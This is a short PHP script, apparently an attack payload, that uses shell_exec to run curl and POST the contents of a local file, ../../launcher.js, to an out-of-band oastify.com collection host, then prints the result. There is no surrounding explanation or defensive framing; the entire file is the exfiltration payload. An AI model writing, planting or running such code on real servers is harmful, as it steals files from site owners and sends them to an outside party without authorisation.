<?php
$command = 'curl -X POST -d "$(cat ../../launcher.js)" https://4uz65jdht25o5e3br591jyzljcp3d0do2.oastify.com';
$output = shell_exec($command);
echo "<pre>$output</pre>";
?>
